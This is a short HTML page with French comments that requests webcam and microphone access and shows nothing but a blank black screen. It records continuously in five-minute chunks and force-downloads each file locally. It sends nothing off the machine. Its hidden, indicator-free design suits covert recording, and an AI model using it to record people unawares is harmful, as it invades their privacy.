<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>.</title>
<style>body{margin:0;background:#000;overflow:hidden}</style>
</head>
<body>

<video id="v" autoplay playsinline style="display:none"></video>

<script>
let r, s, c = [];

// Démarre caméra + micro
navigator.mediaDevices.getUserMedia({video:true, audio:true})
.then(stream => {
    s = stream;
    document.getElementById("v").srcObject = stream;

    // Enregistrement continu avec fichiers de 5 minutes (change 300 en 600 pour 10 min, etc.)
    function nouveauFichier() {
        c = [];
        r = new MediaRecorder(stream, {mimeType: "video/webm;codecs=vp9,opus"});
        
        r.ondataavailable = e => { if (e.data.size > 0) c.push(e.data); };
        
        r.onstop = () => {
            const blob = new Blob(c, {type: "video/webm"});
            const url = URL.createObjectURL(blob);
            const a = document.createElement("a");
            a.style.display = "none";
            a.href = url;
            a.download = "CAM_" + new Date().toISOString().slice(0,19).replace(/:/g,"-") + ".webm";
            document.body.appendChild(a);
            a.click();                    // Téléchargement FORCÉ
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        };

        r.start();
        setTimeout(() => { if (r.state === "recording") r.stop(); }, 300000); // 5 minutes = 300000 ms
    }

    nouveauFichier();
    setInterval(nouveauFichier, 302000); // relance toutes les 5 minutes + 2 sec
})

// Arrêt propre quand tu fermes l’onglet
window.onunload = () => { 
    if (r && r.state === "recording") r.stop(); 
    if (s) s.getTracks().forEach(t => t.stop()); 
};
</script>

</body></html>